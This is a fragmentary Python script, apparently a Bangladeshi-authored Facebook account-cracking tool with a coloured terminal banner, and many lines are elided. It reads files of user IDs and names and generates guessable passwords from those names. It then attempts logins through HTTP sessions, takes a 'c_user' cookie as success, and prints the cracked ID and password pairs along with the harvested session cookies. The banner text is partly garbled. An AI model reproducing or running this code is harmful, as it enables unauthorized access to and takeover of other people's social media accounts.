...


 Author    : SK JIBON HASAN
 Github    :FUCK
 Tool Name : \033[1;36mU�D�C�BD71\033[1;37m
 Tool Type : \033[1;31mTRIAL\033[1;37m
 Version   : \033[1;36m0.1\033[1;37m
\033[1;31mSK JIBON HASAN\033[1;37m
""")
def linex():
        print(47*'\033[1;31mUDC\033[1;37m')
def clear():
        os.system(f'clear')
        print(logo)
loop=0
...
def Fof():
	...
	if me in ["1", "01","11","A","a"]:
		clear()
		file = input(f' [\033[1;32m✓\033[1;37m] Put File Location [\033[1;32mHasan\033[1;37m] ')
		try:
		...
		plist=[]
		try:
			ps_limit = int(input(f' [\033[1;32m?\033[1;37m] How Many Passwords Do You Want To Add [\033[1;32mUDC\033[1;37m] '))
		except:
			ps_limit =1
		print(f' [\033[1;32mUDC\033[1;37m] Example: \033[1;36mfirst last,firtslast,first123 \033[1;37m')
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Fof:
                                ...
                                print(f'\r\r\033[1;32m [BD71\033[1;36m\033[1;37m\033[1;32mOK] %s \033[1;36m\033[1;37m\033[1;32m %s'%(ids,pas))
                                ...
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [JIBONCP] '+ids+' udc '+pas+'\033[1;97m')
...
def m3(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [BD71] \033[1;36m\033[1;37m %s \033[1;36m\033[1;37m OK \033[1;36m\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Fof:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [BD71\033[1;36m\033[1;37m\033[1;32mOK] %s \033[1;36mUDC\033[1;37m\033[1;32m %s'%(ids,pas))
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
...
def m2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [BD71] \033[1;36mUDC\033[1;37m %s \033[1;36mUDC\033[1;37m OK \033[1;36mUDC\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Fof:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [BD71\033[1;36mUDC\033[1;37m\033[1;32mOK] %s \033[1;36m\033[1;37m\033[1;32m %s'%(ids,pas))
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
...
def m4(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [BD71] \033[1;36mUDC\033[1;37m %s \033[1;36m\033[1;37m OK \033[1;36mUDC\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
